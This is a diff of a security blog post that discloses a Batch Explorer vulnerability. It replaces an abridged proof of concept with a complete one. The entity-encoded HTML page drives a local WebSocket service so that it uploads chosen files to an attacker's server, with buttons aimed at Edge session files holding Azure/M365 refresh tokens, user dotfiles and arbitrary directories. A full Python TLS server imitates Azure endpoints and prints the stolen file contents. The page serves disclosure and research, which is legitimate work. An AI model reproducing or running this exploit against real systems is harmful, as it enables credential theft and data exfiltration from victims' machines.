@@ -115,11 +115,9 @@
 <body class="site">
   <header class="site-header">
     <div class="inner">
-      <a href="https://blog.qwertysecurity.com/" class="site-logo">Qwerty Security</a>
       <nav class="site-nav">
         <a href="https://blog.qwertysecurity.com/">Home</a>
-        <a href="https://blog.qwertysecurity.com/tags/">Tags</a>
-        <a href="https://github.com/qwertysecurity">GitHub</a>
+        <a href="https://www.linkedin.com/in/felix-boulet/">LinkedIn</a>
       </nav>
     </div>
   </header>
@@ -223,79 +221,175 @@
           and can touch tokens or files, make authentication a hard requirement, even for localhost.
         </p>
 
-        <h2>PoC HTML (sketchy black & green)</h2>
-        <pre class="code-green"><code>&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;
-&lt;script&gt;
-function batchExfil(fileOrFolder, malServer, recurse) {
-  try { ws.close() } catch(e) {}
-  const ws = new WebSocket('ws://1:1@127.0.0.1:45032/')
-  ws.onopen = () =&gt; {
-    ws.send(\`
-      {"jsonrpc":"2.0",
-       "method":"create-file-group",
-       "params":["asdzwzw","\${fileOrFolder}",{"fullpath":true,"prefix":false,"flatten":false,"recursive":\${recurse}}],
-       "id":0,"request_id":0,
-       "options":{"authentication":{
-         "batchToken":"a.a.azwzw","armToken":"a.a.azwzw",
-         "armUrl":"https://\${malServer}/",
-         "storageEndpoint":"@\${malServer}/storageendpoint/",
-         "account":{ /* … account JSON … */ }
-       }}
-      }
-    \`);
-  }
-  ws.onmessage = m =&gt; console.log('message received', m.data);
-}
-&lt;/script&gt;
-&lt;body&gt;
-  &lt;h1&gt;PoC for Batch Explorer vulnerability&lt;/h1&gt;
-  &lt;!-- input forms & buttons omitted for brevity --&gt;
-&lt;/body&gt;
-&lt;/html&gt;
+        <h2>PoC HTML</h2>
+        <pre class="code-green"><code>&#x0a;&#x3c;html&#x3e;&#x0a;&#x3c;head&#x3e;&#x0a;&#x3c;script&#x3e;&#x0a;function batchExfil&#x28;fileOrFolder&#x2c;malServer&#x2c;recurse&#x29;&#x7b;&#x0a;try&#x7b;ws&#x2e;close&#x28;&#x29;&#x7d;catch&#x28;e&#x29;&#x7b;&#x7d;&#x0a;const ws &#x3d; new WebSocket&#x28;&#x27;ws&#x3a;&#x2f;&#x2f;1&#x3a;1&#x40;127&#x2e;0&#x2e;0&#x2e;1&#x3a;45032&#x2f;&#x27;&#x29;&#x0a;ws&#x2e;onopen &#x3d; &#x28;&#x29; &#x3d;&#x3e; &#x7b;&#x0a;  console&#x2e;log&#x28;&#x27;ws opened on browser&#x27;&#x29;&#x0a;  ws&#x2e;send&#x28;&#x60;&#x0a;          &#x7b;&#x22;jsonrpc&#x22;&#x3a;&#x22;2&#x2e;0&#x22;&#x2c;&#x0a;           &#x22;method&#x22;&#x3a;&#x22;create-file-group&#x22;&#x2c;&#x0a;           &#x22;params&#x22;&#x3a;&#x5b;&#x22;asdzwzw&#x22;&#x2c;&#x22;&#x24;&#x7b;fileOrFolder&#x7d;&#x22;&#x2c;&#x7b;&#x0a;                     &#x22;fullpath&#x22;&#x3a;true&#x2c; &#x22;prefix&#x22;&#x3a;false&#x2c; &#x22;flatten&#x22;&#x3a;false&#x2c;&#x22;recursive&#x22;&#x3a;&#x24;&#x7b;recurse&#x7d;&#x0a;                     &#x7d;&#x5d;&#x2c;&#x0a;            &#x22;id&#x22;&#x3a;0&#x2c;&#x0a;            &#x22;request&#x5f;id&#x22;&#x3a;0&#x2c;&#x0a;           &#x22;options&#x22;&#x3a;&#x7b;&#x0a;               &#x22;authentication&#x22;&#x3a;&#x7b;&#x0a;                   &#x22;batchToken&#x22;&#x3a;&#x22;a&#x2e;a&#x2e;azwzw&#x22;&#x2c;&#x0a;                   &#x22;armToken&#x22;&#x3a;&#x22;a&#x2e;a&#x2e;azwzw&#x22;&#x2c;&#x0a;                   &#x22;armUrl&#x22;&#x3a;&#x22;https&#x3a;&#x2f;&#x2f;&#x24;&#x7b;malServer&#x7d;&#x2f;&#x22;&#x2c;&#x0a;                   &#x22;storageEndpoint&#x22;&#x3a;&#x22;&#x40;&#x24;&#x7b;malServer&#x7d;&#x2f;storageendpoint&#x2f;&#x22;&#x2c;&#x0a;                   &#x22;account&#x22;&#x3a;&#x7b;&#x0a;            &#x22;id&#x22;&#x3a; &#x22;&#x2f;subscriptions&#x2f;00000000-0000-0000-0000-000000000000&#x2f;resourceGroups&#x2f;test-tmp2&#x2f;providers&#x2f;Microsoft&#x2e;Batch&#x2f;batchAccounts&#x2f;testaccountmsobb&#x22;&#x2c;&#x0a;            &#x22;name&#x22;&#x3a; &#x22;testaccountmsobb&#x22;&#x2c;&#x0a;            &#x22;type&#x22;&#x3a; &#x22;Microsoft&#x2e;Batch&#x2f;batchAccounts&#x22;&#x2c;&#x0a;            &#x22;location&#x22;&#x3a; &#x22;canadacentral&#x22;&#x2c;&#x0a;            &#x22;subscription&#x22;&#x3a;&#x7b;&#x22;subscriptionId&#x22;&#x3a;&#x22;00000000-0000-0000-0000-000000000000&#x22;&#x7d;&#x2c;&#x0a;            &#x22;properties&#x22;&#x3a; &#x7b;&#x0a;                           &#x0a;                &#x22;accountEndpoint&#x22;&#x3a; &#x22;testaccountmsobb&#x2e;canadacentral&#x2e;[REDACTED]&#x22;&#x2c;&#x0a;                &#x22;nodeManagementEndpoint&#x22;&#x3a; &#x22;76ccb063-54c8-4de3-aacb-304ccb86c7c3&#x2e;canadacentral&#x2e;service&#x2e;batch&#x2e;azure&#x2e;com&#x22;&#x2c;&#x0a;                &#x22;poolAllocationMode&#x22;&#x3a; &#x22;BatchService&#x22;&#x2c;&#x0a;                &#x22;publicNetworkAccess&#x22;&#x3a; &#x22;Enabled&#x22;&#x2c;&#x0a;                &#x22;networkProfile&#x22;&#x3a; &#x7b;&#x0a;                    &#x22;accountAccess&#x22;&#x3a; &#x7b;&#x0a;                        &#x22;defaultAction&#x22;&#x3a; &#x22;Allow&#x22;&#x0a;                    &#x7d;&#x0a;                &#x7d;&#x2c;&#x0a;                &#x22;encryption&#x22;&#x3a; &#x7b;&#x0a;                    &#x22;keySource&#x22;&#x3a; &#x22;Microsoft&#x2e;Batch&#x22;&#x0a;                &#x7d;&#x0a;            &#x7d;&#x2c;&#x0a;            &#x22;identity&#x22;&#x3a; &#x7b;&#x0a;                &#x22;type&#x22;&#x3a; &#x22;None&#x22;&#x0a;            &#x7d;&#x0a;        &#x7d;&#x0a;                       &#x7d;&#x0a;                       &#x7d;&#x0a;                       &#x7d;&#x0a;                       &#x60;&#x29;&#x0a;&#x7d;&#x0a;&#x0a;ws&#x2e;onmessage &#x3d; &#x28;message&#x29; &#x3d;&#x3e; &#x7b;&#x0a;  console&#x2e;log&#x28;&#x60;message received&#x60;&#x2c; message&#x2e;data&#x29;&#x0a;&#x7d;&#x0a;&#x7d;&#x0a;&#x3c;&#x2f;script&#x3e;&#x0a;&#x3c;head&#x3e;&#x0a;&#x3c;body&#x3e;&#x0a;&#x3c;h1&#x3e;Poc page for batch explorer vulnerability&#x3c;&#x2f;h1&#x3e;&#x0a;&#x3c;div&#x3e;&#x0a;Input your malicious domain hosting the python server ex&#x3a;&#x22;example&#x2e;loc&#x22;&#x0a;&#x3c;input id&#x3d;&#x22;maldomain&#x22; value&#x3d;&#x22;&#x22;&#x3e;&#x0a;&#x3c;&#x2f;div&#x3e;&#x0a;&#x0a;&#x3c;div&#x3e;&#x0a;&#x3c;h2&#x3e;Exfil the tab file which contains the refresh token that was used to connect to the app &#x3c;&#x2f;h2&#x3e;&#x0a;&#x3c;input id&#x3d;&#x22;refreshToken&#x22; size&#x3d;200 value&#x3d;&#x22;C&#x3a;&#x2f;Users&#x2f;&#x2a;&#x2f;AppData&#x2f;Local&#x2f;Microsoft&#x2f;Edge&#x2f;User Data&#x2f;Default&#x2f;Sessions&#x2f;tab&#x2a;&#x22; disabled&#x3e;&#x0a;&#x3c;br&#x3e;&#x3c;button onclick&#x3d;&#x22;if&#x28;maldomain&#x2e;value&#x2e;length&#x3c;3&#x29;&#x7b;maldomain&#x2e;value&#x3d;prompt&#x28;&#x27;input your domain hosting the malicious python server&#x27;&#x2c; &#x27;example&#x2e;loc&#x27;&#x29;&#x7d;&#x3b;batchExfil&#x28;refreshToken&#x2e;value&#x2c;maldomain&#x2e;value&#x2c;false&#x29;&#x22;&#x3e;escalate privileges by exfiltrating azure&#x2f;m365 refresh token&#x3c;&#x2f;button&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;div&#x3e;&#x0a;&#x0a;&#x3c;div&#x3e;&#x0a;&#x3c;h2&#x3e;Exfil username and dot file such as &#x2e;gitconfig&#x3c;&#x2f;h2&#x3e;&#x0a;&#x3c;input id&#x3d;&#x22;exfilUsers&#x22; size&#x3d;200 value&#x3d;&#x22;C&#x3a;&#x2f;Users&#x2f;&#x2a;&#x2f;&#x2e;&#x2a;&#x22; disabled&#x3e;&#x0a;&#x3c;br&#x3e;&#x3c;button onclick&#x3d;&#x22;if&#x28;maldomain&#x2e;value&#x2e;length&#x3c;3&#x29;&#x7b;maldomain&#x2e;value&#x3d;prompt&#x28;&#x27;input your domain hosting the malicious python server&#x27;&#x2c; &#x27;example&#x2e;loc&#x27;&#x29;&#x7d;&#x3b;batchExfil&#x28;exfilUsers&#x2e;value&#x2c;maldomain&#x2e;value&#x2c;false&#x29;&#x22;&#x3e;exfiltrate users&#x3c;&#x2f;button&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;div&#x3e;&#x0a;&#x0a;&#x3c;div&#x3e;&#x0a;&#x3c;h2&#x3e;Exfil from any directory recursively&#x3c;&#x2f;h2&#x3e;&#x0a;&#x3c;input id&#x3d;&#x22;exfilDir&#x22; size&#x3d;200 value&#x3d;&#x22;C&#x3a;&#x2f;ProgramData&#x2f;Microsoft&#x2f;Windows&#x2f;Start Menu&#x2f;Programs&#x2f;Accessories&#x22; &#x3e;&#x0a;&#x3c;br&#x3e;&#x3c;button onclick&#x3d;&#x22;if&#x28;maldomain&#x2e;value&#x2e;length&#x3c;3&#x29;&#x7b;maldomain&#x2e;value&#x3d;prompt&#x28;&#x27;input your domain hosting the malicious python server&#x27;&#x2c; &#x27;example&#x2e;loc&#x27;&#x29;&#x7d;&#x3b;batchExfil&#x28;exfilDir&#x2e;value&#x2c;maldomain&#x2e;value&#x2c;true&#x29;&#x22;&#x3e;exfiltrate a directory of your choice&#x3c;&#x2f;button&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;div&#x3e;&#x0a;&#x0a;&#x3c;div&#x3e;&#x0a;&#x3c;h2&#x3e;Exfil a single file&#x3c;&#x2f;h2&#x3e;&#x0a;&#x3c;input id&#x3d;&#x22;singleFile&#x22; size&#x3d;200 value&#x3d;&#x22;c&#x3a;&#x2f;windows&#x2f;debug&#x2f;netsetup&#x2e;log&#x22; &#x3e;&#x0a;&#x3c;br&#x3e;&#x3c;button onclick&#x3d;&#x22;if&#x28;maldomain&#x2e;value&#x2e;length&#x3c;3&#x29;&#x7b;maldomain&#x2e;value&#x3d;prompt&#x28;&#x27;input your domain hosting the malicious python server&#x27;&#x2c; &#x27;example&#x2e;loc&#x27;&#x29;&#x7d;&#x3b;batchExfil&#x28;singleFile&#x2e;value&#x2c;maldomain&#x2e;value&#x2c;false&#x29;&#x22;&#x3e;exfiltrate a file of your choice&#x3c;&#x2f;button&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;div&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;body&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;html&#x3e;
 </code></pre>
 
-        <h2>Python Server PoC (black & green)</h2>
-        <pre class="code-green"><code>from http.server import HTTPServer, SimpleHTTPRequestHandler
-import ssl, logging, http
+        <h2>Python Server PoC</h2>
+        <pre class="code-green"><code>from http.server import HTTPServer,SimpleHTTPRequestHandler
+import http
+import ssl
+import logging
+from http import HTTPStatus
 
-class MyHTTPRequestHandler(SimpleHTTPRequestHandler):
+PORT = 8443
+
+class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
     def handle_request(self):
-        path = self.path.split('?')[0]
-        if path.endswith('batchAccounts'):
+        logging.error(self.headers)
+        logging.error(self.request)
+        """Unified handler for all HTTP methods."""
+        print(self.path)
+        self.protocol_version = "HTTP/1.1"
+        if self.path.split("?")[0].endswith("batchAccounts") == True:
             self.send_response(http.HTTPStatus.OK)
-            message = '{ "value": [ /* account JSON */ ] }'
-            self.send_header('Content-Type','application/json')
-        elif path.endswith('listKeys'):
+            message = '''{
+    "value": [
+        {
+            "id": "/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/test-tmp2/providers/Microsoft.Batch/batchAccounts/testaccountmsobb",
+            "name": "testaccountmsobb",
+            "type": "Microsoft.Batch/batchAccounts",
+            "location": "canadacentral",
+            "properties": {
+                "accountEndpoint": "testaccountmsobb.canadacentral.[REDACTED]",
+                "nodeManagementEndpoint": "00000000-0000-0000-0000-000000000000.canadacentral.service.batch.azure.com",
+                "provisioningState": "Succeeded",
+                "dedicatedCoreQuota": 6,
+                "dedicatedCoreQuotaPerVMFamily": [
+                    {
+                        "name": "standardAv2Family",
+                        "coreQuota": 6
+                    }
+                ],
+                "dedicatedCoreQuotaPerVMFamilyEnforced": true,
+                "lowPriorityCoreQuota": 6,
+                "poolQuota": 20,
+                "activeJobAndJobScheduleQuota": 100,
+                "autoStorage": {
+"storageAccountId": "/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/test-tmp2/providers/Microsoft.Storage/storageAccounts/zwzwzw",
+                    "lastKeySync": "2024-11-25T18:57:18.3288351Z",
+                    "authenticationMode": "BatchAccountManagedIdentity"
+                },
+                "poolAllocationMode": "BatchService",
+                "publicNetworkAccess": "Enabled",
+                "networkProfile": {
+                    "accountAccess": {
+                        "defaultAction": "Allow"
+                    }
+                },
+                "privateEndpointConnections": [],
+                "encryption": {
+                    "keySource": "Microsoft.Batch"
+                },
+                "allowedAuthenticationModes": [
+                    "AAD",
+                    "TaskAuthenticationToken"
+                ]
+            },
+            "identity": {
+                "type": "None"
+            }
+        }
+    ]
+}'''
+            self.send_header("Content-Type", "application/json")        
+        elif self.path.split("?")[0].endswith("listKeys") == True:
+            message = '''{"keys":[{"keyName":"key1","value":"","permissions":"FULL"},{"keyName":"key2","value":"","permissions":"FULL"}]}
+'''
             self.send_response(http.HTTPStatus.OK)
-            message = '{"keys":[{"keyName":"key1","value":"","permissions":"FULL"}]}'
-            self.send_header('Content-Type','application/json')
-        elif self.path.startswith('/storageendpoint/'):
+            self.send_header("Content-Type", "application/json")
+
+        elif self.path.endswith("&restype=container") == True:
+            message = '''<?xml version="1.0" encoding="utf-8"?><EnumerationResults ServiceEndpoint="https://batch.qwertysecurity.com/" ContainerName="test123"><MaxResults>30</MaxResults><Delimiter>/</Delimiter><Blobs /><NextMarker /></EnumerationResults>
+'''
+            self.send_response(http.HTTPStatus.OK)
+            self.send_header("Content-Type", "text/xml")
+
+        elif self.path.endswith("&comp=metadata") == True:
+            self.send_response(http.HTTPStatus.OK)
+            message = '''{"keys":[{"keyName":"key1","value":""}]}
+'''
+            self.send_header("Content-Type", "text/xml")
+
+        elif self.path.startswith("/storageendpoint/") == True:
+            message = '''Okay
+'''
             self.send_response(http.HTTPStatus.CREATED)
-            message = 'Okay'
-            self.send_header('access-control-allow-origin','*')
-            self.send_header('Content-Type','application/octet-stream')
+            self.send_header("access-control-allow-origin", "*")
+            self.send_header("access-control-expose-headers", "x-ms-request-id,x-ms-client-request-id,Server,x-ms-version,x-ms-content-crc64,Content-MD5,Last-Modified,ETag,x-ms-request-server-encrypted,Content-Length,Date,Transfer-Encoding")
+            self.send_header("content-md5", "bWhXUMmjaSzZ/ykNM6jvMQ==")
+            self.send_header("date", "Mon, 25 Nov 2024 20:47:10 GMT")
+            self.send_header("etag", "0x8DD0D9255CFEF53")
+            self.send_header("last-modified", "Mon, 20 Nov 2020 20:20:20 GMT")
+            self.send_header("server", "Windows-Azure-Blob/1.0 Microsoft-HTTPAPI/2.0")
+            self.send_header("x-ms-client-request-id", "4a99d12d-4fc4-487b-ab78-ca40a75f0013")
+            self.send_header("x-ms-content-crc64", "YD3+dFyECL8=")
+            self.send_header("x-ms-request-id", "00000000-0000-0000-0000-000000000000")
+            self.send_header("x-ms-request-server-encrypted", "true")
+            self.send_header("x-ms-version", "2022-11-02")
+            self.send_header("Content-Type", "application/octet-stream")
+
         else:
-            self.send_response(http.HTTPStatus.NOT_FOUND)
             message = 'not found'
-
-        # common headers
-        self.send_header('Cache-Control','no-cache')
+        # Send response headers
+#        logging.error("Received query to path: \r\n" +self.path+ " Sending message: \r\n"+message)
+        self.send_header("Content-Security-Policy","default-src 'self'")
+        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
+        self.send_header("Pragma", "no-cache")
+        self.send_header("Expires", "0")
+#        self.send_header("Content-Length", str(len(message)))
+        self.send_header("X-Ms-Request-Id", "24b77f2f-16bd-440b-ae35-e94effbf1e6a")
+        self.send_header("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
+        self.send_header("X-Ms-Ratelimit-Remaining-Subscription-Resource-Requests", "11999")
+        self.send_header("X-Ms-Correlation-Request-Id", "7e8169e0-4c2c-4665-a1bf-a6e3a52ce5af")
+        self.send_header("X-Ms-Routing-Request-Id", "CANADAEAST:20241125T144212Z:7e8169e0-4c2c-4665-a1bf-a6e3a52ce5af")
+        self.send_header("X-Content-Type-Options", "nosniff")
+        self.send_header("X-Cache", "CONFIG_NOCACHE")
+        self.send_header("X-Msedge-Ref", "Ref A: 45CA1FE5577C49F6B34D3EDFAD79E2E8 Ref B: YTO221090814035 Ref C: 2024-11-25T14:42:12Z")
+        self.send_header("Date", "Mon, 25 Nov 2024 14:42:11 GMT")
+        self.send_header("x-ms-error-code","BlobNotFound")
         self.end_headers()
-        self.wfile.write(message.encode())
 
-    def do_GET(self):    self.handle_request()
-    def do_POST(self):
-        length = int(self.headers.get('Content-Length',0))
-        body = self.rfile.read(length).decode('utf-8','ignore')
-        print(f"POST body: {body}")
+        # Write the response body
+        self.wfile.write(message.encode('utf-8'))
+
+    # Override all HTTP method handlers to use handle_request
+    def do_GET(self):
         self.handle_request()
-    # Options, PUT, DELETE etc. all map to handle_request…
 
-httpd = HTTPServer(('0.0.0.0',443), MyHTTPRequestHandler)
+    def do_POST(self):
+        content_length = int(self.headers.get('Content-Length', 0))
+        post_body = self.rfile.read(content_length)
+        print(f"Received POST body: {post_body.decode('utf-8')}")
+        self.handle_request()
+
+    def do_OPTIONS(self):
+        self.handle_request()
+
+    def do_PUT(self):
+        content_length = int(self.headers.get('Content-Length', 0))
+        post_body = b'Received PUT body: '+self.rfile.read(content_length)
+        print('\r\n==========================================\r\n')
+        print(post_body.decode('ISO-8859-1'))
+        print('\r\n==========================================\r\n')
+        self.handle_request()
+
+    def do_DELETE(self):
+        self.handle_request()
+
+    def do_HEAD(self):
+        self.handle_request()
+
+    def do_PATCH(self):
+        self.handle_request()
+
+
+httpd = HTTPServer(('0.0.0.0', 443), MyHTTPRequestHandler)
+# Since version 3.10: SSLContext without protocol argument is deprecated. 
+# sslctx = ssl.SSLContext()
 sslctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-sslctx.load_cert_chain('certificate.crt','private.key')
+sslctx.check_hostname = False # If set to True, only the hostname that matches the certificate will be accepted
+sslctx.load_cert_chain(certfile='certificate.crt', keyfile="private.key")
 httpd.socket = sslctx.wrap_socket(httpd.socket, server_side=True)
 httpd.serve_forever()
 </code></pre>
